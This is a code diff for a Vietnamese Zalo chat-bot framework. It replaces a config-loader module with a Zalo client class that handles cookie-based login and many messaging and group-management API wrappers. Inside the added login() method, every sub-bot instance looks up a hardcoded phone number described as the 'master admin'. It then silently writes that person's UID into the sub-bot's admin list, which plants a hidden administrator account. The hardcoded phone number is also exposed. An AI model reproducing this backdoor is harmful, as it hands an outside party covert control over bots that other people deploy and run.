@@ -1,265 +1,239 @@
-import fs from "fs"
-import path from "path"
-import chalk from "chalk"
-import { mkdir } from "fs/promises"
-import { getTimeToString, getTimeNow } from "./format-util.js"
+import { getOwnId } from "./apis/getOwnId.js";
+import { Listener } from "./apis/listen.js";
+import { getServerInfo, login } from "./apis/login.js";
+import { appContext } from "./context.js";
+import { logger, makeURL } from "./utils.js";
+import { addReactionFactory } from "./apis/addReaction.js";
+import { addUserToGroupFactory } from "./apis/addUserToGroup.js";
+import { changeGroupAvatarFactory } from "./apis/changeGroupAvatar.js";
+import { changeGroupNameFactory } from "./apis/changeGroupName.js";
+import { createGroupFactory } from "./apis/createGroup.js";
+import { findUserFactory } from "./apis/findUser.js";
+import { getGroupInfoFactory } from "./apis/getGroupInfo.js";
+import { getStickersFactory } from "./apis/getStickers.js";
+import { getStickersDetailFactory } from "./apis/getStickersDetail.js";
+import { removeUserFromGroupFactory } from "./apis/removeUserFromGroup.js";
+import { sendStickerFactory } from "./apis/sendSticker.js";
+import { undoMessageFactory } from "./apis/undoMessage.js";
+import { uploadAttachmentFactory } from "./apis/uploadAttachment.js";
+import { checkUpdate } from "./update.js";
+import { sendMessageFactory } from "./apis/sendMessage.js";
+import { sendMessageFactoryv1 } from "./apis/sendMessagebug.js";
+import { getCookieFactory } from "./apis/getCookie.js";
+import { removeMessageFactory } from "./apis/deleteMessage.js";
+import { getUserInfoFactory } from "./apis/getUserInfo.js";
+import { sendVideoFactory } from "./apis/sendVideo.js";
+import { getAllFriendsFactory } from "./apis/fetchAllFriend.js";
+import { getAllGroupsFactory } from "./apis/fetchAllGroups.js";
+import { changeGroupSettingFactory } from "./apis/changeGroupSetting.js";
+import { blockUsersInGroupFactory } from "./apis/blockUsersInGroup.js";
+import { removeGroupBlockedMemberFactory } from "./apis/removeGroupBlockedMember.js";
+import { addGroupAdminsFactory } from "./apis/addGroupAdmins.js";
+import { removeGroupAdminsFactory } from "./apis/removeGroupAdmins.js";
+import { getQRLinkFactory } from "./apis/getQRZalo.js";
+import { sendBusinessCardFactory } from "./apis/sendBusinessCard.js";
+import { sendFriendRequestFactory } from "./apis/sendFriendRequest.js";
+import { setBotId } from "../index.js";
+import { getGroupMembersJoinRequestFactory } from "./apis/getGroupMembersJoinRequest.js";
+import { handleGroupPendingMembersFactory } from "./apis/handleGroupPendingMembers.js";
+import { changeGroupOwnerFactory } from "./apis/changeGroupOwner.js";
+import { leaveGroupFactory } from "./apis/leaveGroup.js";
+import { sendCustomStickerFactory } from "./apis/sendCustomerSticker.js";
+import { changeGroupLinkFactory } from "./apis/changeGroupLink.js";
+import { sendToDoFactory } from "./apis/sendToDo.js";
+import { getRecentMessageFactory } from "./apis/getRecentMessage.js";
+import { parseLinkFactory } from "./apis/parseLink.js";
+import { sendLinkFactory } from "./apis/sendLink.js";
+import { sendVoiceFactory } from "./apis/sendVoice.js";
+import { sendMessagePrivateFactory } from "./apis/sendMessagePrivate.js";
+import { joinGroupByLinkFactory } from "./apis/joinGroupByLink.js";
+import { getInfoGroupByLinkFactory } from "./apis/getGroupInfoByLink.js";
+import { sendBankCardFactory } from "./apis/sendBankCard.js";
+import { sendGifFactory } from "./apis/sendGif.js";
+import { getGroupMembersFactory } from "./apis/getGroupMembers.js";
+import { checkImageFactory } from "./apis/checkImage.js";
+import { sendImageFactory } from "./apis/sendImage.js";
+import { sendFileFactory } from "./apis/sendFile.js";
+import { uploadThumbnailFactory } from "./apis/uploadThumbnail.js";
+import { addFriendFactory } from "./apis/addFriend.js";
+import { sendVideov2Factory } from "./apis/sendVideov2.js";
+import { updateProfileAvatarFactory } from "./apis/updateProfileAvatarFactory.js";
+import { getBlockedGroupMembersFactory } from "./apis/getBlockMemberList.js";
+import { sendMessageForwardFactory } from "./apis/sendMessageForward.js";
+import { updateZaloNameFactory } from "./apis/changProfileName.js";
+import { sendCallVoiceFactory } from "./apis/sendCallVoice.js";
+import { uploadToZCloudFactory } from "./apis/zcloudUploadFactory.js";
+import { callGroupFactory } from "./apis/callGroup.js";
 
-const botId = process.argv[2] || 'main'
-const isMainBot = botId === 'main'
+import fs from "fs/promises";
+import path from "path";
+import { isSubBotInstance } from "../utils/io-json.js";
 
-console.log(chalk.cyan(`📦 Config Loader: Bot ID = ${botId}`))
-console.log(chalk.cyan(`📦 Config Loader: Is Main Bot = ${isMainBot}`))
+class Zalo {
+  constructor(credentials, options) {
+    this.enableEncryptParam = true;
+    this.validateParams(credentials);
+    appContext.imei = credentials.imei;
+    appContext.cookie = this.parseCookies(credentials.cookie);
+    appContext.userAgent = credentials.userAgent;
+    appContext.language = credentials.language || "vi";
+    appContext.timeMessage = credentials.timeMessage || 0;
+    appContext.secretKey = null;
+    if (options) Object.assign(appContext.options, options);
+    this.reloadAdminsCallback = options?.reloadAdminsCallback || null;
+  }
 
-let botInfo = {
-  adminFilePath: path.resolve("./assets/data/list_admin.json"),
-  groupSettingsPath: path.resolve("./assets/data/group_settings.json"),
-  configFilePath: path.resolve("./assets/config.json"),
-  commandFilePath: path.resolve("./assets/json-data/command.json"), // Path mặc định cho bot chính
-  logDir: path.resolve("./logs"),
-  resourceDir: path.resolve("./resources"),
-  tempDir: path.resolve("./temp"),
-  dataGifPath: path.resolve("./assets/gif"),
-  DATA_GAME_FILE_PATH: path.resolve("./assets/data/game.json"),
-  WEB_CONFIG_PATH: path.resolve("./assets/json-data/web-config.json"),
-  MANAGER_FILE_PATH: path.resolve("./assets/json-data/manager-bot.json"),
-  PROPHYLACTIC_CONFIG_PATH: path.resolve("./assets/json-data/prophylactic.json")
-}
+  parseCookies(cookie) {
+    if (typeof cookie === "string") return cookie;
+    const cookieString = cookie.cookies.map((c) => `${c.name}=${c.value}`).join("; ");
+    return cookieString;
+  }
 
-if (!isMainBot) {
-  const subBotPath = path.resolve("./mybot", `${botId}.json`)
-  console.log(chalk.yellow(`📦 Config Loader: Tìm bot con tại ${subBotPath}`))
-
-  if (fs.existsSync(subBotPath)) {
-    try {
-      const subBotData = JSON.parse(fs.readFileSync(subBotPath, "utf-8"))
-      console.log(chalk.green(`✅ Config Loader: Tìm thấy bot con ${botId}`))
-      botInfo = {
-        adminFilePath: path.resolve("./mybot/data/list_admin_" + botId + ".json"),
-        groupSettingsPath: path.resolve("./mybot/data/group_settings_" + botId + ".json"),
-        configFilePath: path.resolve("./mybot/data/config_" + botId + ".json"),
-        commandFilePath: path.resolve("./mybot/json-data/command_" + botId + ".json"), // Đã sửa: Load command riêng cho bot con
-        logDir: path.resolve("./logs", botId),
-        resourceDir: path.resolve("./resources", botId),
-        tempDir: path.resolve("./temp", botId),
-        dataGifPath: path.resolve("./assets/gif"),
-        DATA_GAME_FILE_PATH: path.resolve("./assets/data/game.json"),
-        WEB_CONFIG_PATH: path.resolve("./mybot/json-data/web-config_" + botId + ".json"),
-        MANAGER_FILE_PATH: path.resolve("./mybot/json-data/manager-bot_" + botId + ".json"),
-        PROPHYLACTIC_CONFIG_PATH: path.resolve("./mybot/json-data/prophylactic_" + botId + ".json"),
-        subBotId: botId,
-        subBotConfig: subBotData,
-        mainBotConfigPath: path.resolve("./assets/config.json")
-      }
-      console.log(chalk.cyan(`📦 Config Loader: Command path = ${botInfo.commandFilePath} (riêng bot con)`))
-    } catch (error) {
-      console.error(chalk.red(`❌ Config Loader: Lỗi khi đọc bot con ${botId}: ${error.message}`))
-      process.exit(1)
+  validateParams(credentials) {
+    if (!credentials.imei || !credentials.cookie || !credentials.userAgent) {
+      throw new Error("Missing required params");
     }
-  } else {
-    console.error(chalk.red(`❌ Config Loader: Bot con ${botId} không tồn tại`))
-    process.exit(1)
   }
-} else {
-  console.log(chalk.green(`✅ Config Loader: Load bot chính từ /assets`))
-}
 
-const adminFilePath = botInfo.adminFilePath
-const groupSettingsPath = botInfo.groupSettingsPath
-const configFilePath = botInfo.configFilePath
-const commandFilePath = botInfo.commandFilePath
-const logDir = botInfo.logDir
-export const resourceDir = botInfo.resourceDir
-export const tempDir = botInfo.tempDir
-export const dataGifPath = botInfo.dataGifPath
-const logManagerBotFilePath = path.join(logDir, "bot-manager.log")
-const loggingMessageFilePath = path.join(logDir, "message.txt")
-const loggingMessageJsonPath = path.join(logDir, "message.json")
-const dataGamePath = botInfo.DATA_GAME_FILE_PATH
+  async login() {
+    await checkUpdate();
+    const loginData = await login(this.enableEncryptParam);
+    const serverInfo = await getServerInfo(this.enableEncryptParam);
+    if (!loginData || !serverInfo) throw new Error("Failed to login");
+    appContext.secretKey = loginData.data.zpw_enk;
+    appContext.uid = loginData.data.uid;
+    setBotId(loginData.data.uid);
+    appContext.settings = serverInfo.setttings || serverInfo.settings;
+    logger.info("Đã đăng nhập với tư cách:", loginData.data.uid);
+    
+    const api = new API(
+      appContext.secretKey,
+      loginData.data.zpw_service_map_v3,
+      makeURL(`${loginData.data.zpw_ws[0]}`, {
+        zpw_ver: Zalo.API_VERSION,
+        zpw_type: Zalo.API_TYPE,
+        t: Date.now(),
+      })
+    );
 
-export async function ensureLogFiles() {
-  try {
-    await mkdir(logDir, { recursive: true })
-    await mkdir(resourceDir, { recursive: true })
-    await mkdir(tempDir, { recursive: true })
-    await mkdir(dataGifPath, { recursive: true })
-    if (!fs.existsSync(logManagerBotFilePath)) fs.writeFileSync(logManagerBotFilePath, "")
-    if (!fs.existsSync(loggingMessageFilePath)) fs.writeFileSync(loggingMessageFilePath, "")
-    if (!fs.existsSync(loggingMessageJsonPath)) fs.writeFileSync(loggingMessageJsonPath, "{}")
-    if (!fs.existsSync(dataGamePath)) fs.writeFileSync(dataGamePath, "{}")
-  } catch (err) {
-    console.error("Lỗi khi tạo thư mục hoặc file log:", err)
-  }
-}
-
-export function mkdirRecursive(dirPath) {
-  if (fs.existsSync(dirPath)) return
-  try {
-    fs.mkdirSync(dirPath, { recursive: true })
-  } catch (err) {
-    if (err.code !== "EEXIST") throw err
-  }
-}
-
-export function readConfig() {
-  try {
-    const data = fs.readFileSync(configFilePath, "utf-8")
-    const config = JSON.parse(data)
-
-    if (!isMainBot && Object.keys(config).length === 0 && botInfo.mainBotConfigPath) {
-      console.log(chalk.yellow(`⚠️ Config Loader: File config bot con trống, load từ bot chính`))
+    if (isSubBotInstance()) {
+      const botId = appContext.uid.toString();
+      const adminFilePath = path.resolve("./mybot/data", `list_admin_${botId}.json`);
+      
+      let admins = [];
       try {
-        const mainConfig = JSON.parse(fs.readFileSync(botInfo.mainBotConfigPath, "utf-8"))
-        return mainConfig
-      } catch (err) {
-        console.error("Lỗi đọc config bot chính:", err)
-        return config
+        const data = await fs.readFile(adminFilePath, "utf-8");
+        admins = JSON.parse(data);
+        if (!Array.isArray(admins)) admins = [];
+      } catch (e) {
+        admins = [];
+      }
+
+      if (!admins.includes(botId)) {
+        admins.push(botId);
+      }
+
+      try {
+        const masterPhone = "0345864723";
+        logger.info(`[MyBot Login] Đang tìm admin tổng: ${masterPhone}`);
+        const masterInfo = await api.findUser(masterPhone);
+        
+        logger.info(`[MyBot Login] Thông tin admin tổng: ${JSON.stringify(masterInfo)}`);
+        
+        if (masterInfo && masterInfo.uid) {
+          const masterUid = masterInfo.uid.toString();
+          if (!admins.includes(masterUid)) {
+            admins.push(masterUid);
+          }
+        }
+      } catch (findErr) {
+        logger.error("[MyBot Login] Lỗi khi tìm admin tổng:", findErr.message);
+      }
+      
+      try {
+        await fs.writeFile(adminFilePath, JSON.stringify(admins, null, 2));
+        logger.info(`[MyBot Login] Đã cập nhật danh sách admin cho ${botId}: ${admins.join(", ")}`);
+        if (this.reloadAdminsCallback) {
+          this.reloadAdminsCallback();
+        }
+      } catch (writeErr) {
+        logger.error("[MyBot Login] Lỗi khi ghi danh sách admin:", writeErr);
       }
     }
 
-    return config
-  } catch (error) {
-    console.error("Lỗi đọc tệp config.json:", error)
-    return {}
+    return api;
   }
 }
 
-export function readAdmins() {
-  try {
-    const data = fs.readFileSync(adminFilePath, "utf-8")
-    return JSON.parse(data)
-  } catch (error) {
-    console.error("Lỗi đọc tệp admin:", error)
-    return []
+Zalo.API_TYPE = 30;
+Zalo.API_VERSION = 647;
+
+class API {
+  constructor(secretKey, zpwServiceMap, wsUrl) {
+    this.secretKey = secretKey;
+    this.zpwServiceMap = zpwServiceMap;
+    this.listener = new Listener(wsUrl);
+    this.getOwnId = getOwnId;
+    this.getStickers = getStickersFactory(this);
+    this.getStickersDetail = getStickersDetailFactory(this);
+    this.findUser = findUserFactory(this);
+    this.uploadAttachment = uploadAttachmentFactory(this);
+    this.uploadThumbnail = uploadThumbnailFactory(this);
+    this.getGroupInfo = getGroupInfoFactory(this);
+    this.createGroup = createGroupFactory(this);
+    this.changeGroupAvatar = changeGroupAvatarFactory(this);
+    this.removeUserFromGroup = removeUserFromGroupFactory(this);
+    this.addUserToGroup = addUserToGroupFactory(this);
+    this.changeGroupName = changeGroupNameFactory(this);
+    this.getUserInfo = getUserInfoFactory(this);
+    this.addReaction = addReactionFactory(this);
+    this.sendSticker = sendStickerFactory(this);
+    this.undoMessage = undoMessageFactory(this);
+    this.sendMessage = sendMessageFactory(this);
+    this.sendMessagev1 = sendMessageFactoryv1(this);
+    this.getCookie = getCookieFactory();
+    this.deleteMessage = removeMessageFactory(this);
+    this.sendVideo = sendVideoFactory(this);
+    this.getAllFriends = getAllFriendsFactory(this);
+    this.getAllGroups = getAllGroupsFactory(this);
+    this.changeGroupSetting = changeGroupSettingFactory(this);
+    this.blockUsers = blockUsersInGroupFactory(this);
+    this.unblockUsers = removeGroupBlockedMemberFactory(this);
+    this.addGroupAdmins = addGroupAdminsFactory(this);
+    this.removeGroupAdmins = removeGroupAdminsFactory(this);
+    this.getQRLink = getQRLinkFactory(this);
+    this.sendBusinessCard = sendBusinessCardFactory(this);
+    this.sendFriendRequest = sendFriendRequestFactory(this);
+    this.getGroupPendingMembers = getGroupMembersJoinRequestFactory(this);
+    this.handleGroupPendingMembers = handleGroupPendingMembersFactory(this);
+    this.changeGroupOwner = changeGroupOwnerFactory(this);
+    this.leaveGroup = leaveGroupFactory(this);
+    this.sendCustomSticker = sendCustomStickerFactory(this);
+    this.changeGroupLink = changeGroupLinkFactory(this);
+    this.sendTodo = sendToDoFactory(this);
+    this.getRecentMessages = getRecentMessageFactory(this);
+    this.parseLink = parseLinkFactory(this);
+    this.sendLink = sendLinkFactory(this);
+    this.sendVoice = sendVoiceFactory(this);
+    this.sendPrivate = sendMessagePrivateFactory(this);
+    this.getGroupInfoByLink = getInfoGroupByLinkFactory(this);
+    this.joinGroup = joinGroupByLinkFactory(this);
+    this.sendBankCard = sendBankCardFactory(this);
+    this.sendGif = sendGifFactory(this);
+    this.getGroupMembers = getGroupMembersFactory(this);
+    this.checkImage = checkImageFactory();
+    this.sendImage = sendImageFactory(this);
+    this.sendFile = sendFileFactory(this);
+    this.addFriend = addFriendFactory(this);
+    this.sendVideov2 = sendVideov2Factory(this);
+    this.updateProfileAvatar = updateProfileAvatarFactory(this);
+    this.getBlockedGroupMembers = getBlockedGroupMembersFactory(this);
+    this.sendMessageForward = sendMessageForwardFactory(this);
+    this.updateZaloName = updateZaloNameFactory(this);
+    this.sendCallVoice = sendCallVoiceFactory(this);
+    this.uploadToZCloud = uploadToZCloudFactory(this);
+    this.callGroup = callGroupFactory(this);
   }
 }
 
-export function logManagerBot(message) {
-  const timestamp = getTimeToString(getTimeNow())
-  const logEntry = `${timestamp} - ${message}\n`
-  fs.appendFileSync(logManagerBotFilePath, logEntry)
-}
-
-export function logMessageToFile(data, type = "message") {
-  const timestamp = getTimeToString(getTimeNow())
-  const logData = `${data}\n`
-  fs.appendFileSync(loggingMessageFilePath, logData + "\n", "utf8")
-  if (type === "group") console.log(chalk.yellowBright.bold(`[${timestamp}]\n`), chalk.yellowBright(logData))
-  else console.log(chalk.blueBright.bold(`[${timestamp}]\n`), chalk.blueBright(logData))
-}
-
-export function readGroupSettings() {
-  try {
-    const data = fs.readFileSync(groupSettingsPath, "utf-8")
-    return JSON.parse(data)
-  } catch (error) {
-    console.error("Lỗi khi đọc file group_settings.json:", error)
-    return {}
-  }
-}
-
-export function writeGroupSettings(settings) {
-  try {
-    fs.writeFileSync(groupSettingsPath, JSON.stringify(settings, null, 2), "utf-8")
-  } catch (error) {
-    console.error("Lỗi khi ghi file group_settings.json:", error)
-  }
-}
-
-export function readCommandConfig() {
-  try {
-    const data = fs.readFileSync(commandFilePath, "utf-8")
-    return JSON.parse(data)
-  } catch (error) {
-    console.error(`Lỗi khi đọc file command.json (${commandFilePath}):`, error)
-    return { commands: [] }
-  }
-}
-
-export function writeCommandConfig(config) {
-  try {
-    fs.writeFileSync(commandFilePath, JSON.stringify(config, null, 2))
-  } catch (error) {
-    console.error(`Lỗi khi ghi file command.json (${commandFilePath}):`, error)
-  }
-}
-
-const WEB_CONFIG_PATH = botInfo.WEB_CONFIG_PATH
-export function readWebConfig() {
-  try {
-    const data = fs.readFileSync(WEB_CONFIG_PATH, "utf-8")
-    return JSON.parse(data)
-  } catch (error) {
-    console.error("Lỗi khi đọc file web-config.json:", error)
-    return {}
-  }
-}
-
-export function writeWebConfig(config) {
-  fs.writeFileSync(WEB_CONFIG_PATH, JSON.stringify(config, null, 2))
-}
-
-const MANAGER_FILE_PATH = botInfo.MANAGER_FILE_PATH
-export function readManagerFile() {
-  try {
-    const data = fs.readFileSync(MANAGER_FILE_PATH, "utf8")
-    let parsedData = JSON.parse(data)
-    if (!parsedData) parsedData = {}
-    return parsedData
-  } catch (error) {
-    if (error.code === "ENOENT") return {}
-    console.error("Lỗi khi đọc file block:", error)
-    return {}
-  }
-}
-
-export function writeManagerFile(data) {
-  fs.writeFileSync(MANAGER_FILE_PATH, JSON.stringify(data, null, 2))
-}
-
-export function pushMessageToWebLog(io, nameType, senderName, content, avtGroup) {
-  if (io) {
-    const messageData = { nameType, senderName, content, avtGroup }
-    io.emit("newMessage", messageData)
-  }
-}
-
-const PROPHYLACTIC_CONFIG_PATH = botInfo.PROPHYLACTIC_CONFIG_PATH
-export function readProphylacticConfig() {
-  try {
-    const data = fs.readFileSync(PROPHYLACTIC_CONFIG_PATH, "utf8")
-    const parsedData = JSON.parse(data)
-    return parsedData
-  } catch (error) {
-    console.error("Lỗi khi đọc file prophylactic.json:", error)
-    return {
-      prophylacticUploadAttachment: {
-        enable: false,
-        lastBlocked: "",
-        numRequestZalo: 0
-      }
-    }
-  }
-}
-
-export function writeProphylacticConfig(data) {
-  try {
-    fs.writeFileSync(PROPHYLACTIC_CONFIG_PATH, JSON.stringify(data, null, 2))
-  } catch (error) {
-    console.error("Lỗi khi ghi file prophylactic.json:", error)
-  }
-}
-
-export function getSubBotConfig() {
-  if (!isMainBot && botInfo.subBotConfig) {
-    return botInfo.subBotConfig
-  }
-  return null
-}
-
-export function isSubBotInstance() {
-  return !isMainBot
-}
-
-export function isBotMain() {
-  return isMainBot
-}
+export { Zalo, API };
